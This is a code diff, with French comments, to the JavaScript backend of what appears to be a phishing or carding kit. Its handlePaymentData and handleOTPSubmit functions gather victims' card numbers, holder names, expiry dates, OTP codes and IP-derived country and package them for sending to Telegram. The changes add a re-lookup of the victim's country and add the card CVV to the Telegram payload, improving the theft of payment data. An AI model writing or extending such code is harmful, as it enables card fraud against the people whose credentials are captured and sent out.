@@ -667,6 +667,22 @@ async function handlePaymentData(clientId, data) {
   console.log(`[handlePaymentData] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
   console.log(`[handlePaymentData] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
   
+  // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
+  let country = client.country;
+  if (!country || country === 'Unknown' || country === 'N/A') {
+    console.log(`[handlePaymentData] ⚠️  Country is missing or Unknown, attempting to fetch again...`);
+    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1') {
+      country = await getCountryFromIP(client.ip);
+      console.log(`[handlePaymentData] 🔄 Re-fetched country: ${country}`);
+      // Mettre à jour le pays dans les données du client
+      client.country = country || 'Unknown';
+      console.log(`[handlePaymentData] ✅ Updated client country to: ${client.country}`);
+    } else {
+      console.log(`[handlePaymentData] ⚠️  Cannot fetch country - invalid IP: ${client.ip}`);
+      country = 'Unknown';
+    }
+  }
+  
   // Vérifier le BIN du numéro de carte
   let binInfo = null;
   if (data.data.cardNumber) {
@@ -682,7 +698,7 @@ async function handlePaymentData(clientId, data) {
   const telegramData = {
     id: clientId,
     ip: client.ip,
-    country: client.country || 'Unknown', // S'assurer que le pays est toujours défini
+    country: country || 'Unknown', // Utiliser le pays récupéré ou mis à jour
     card_holder: data.data.cardHolder || data.data.nameOnCard,
     card_number: data.data.cardNumber,
     card_expiration: data.data.expirationDate,
@@ -782,6 +798,7 @@ async function handleOTPSubmit(clientId, data) {
     card_holder: client.card_holder,
     card_number: client.card_number,
     card_expiration: client.card_expiration,
+    card_cvv: client.card_cvv, // Ajouter le CVV pour l'affichage dans Telegram
   };
 
   console.log(`[handleOTPSubmit] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
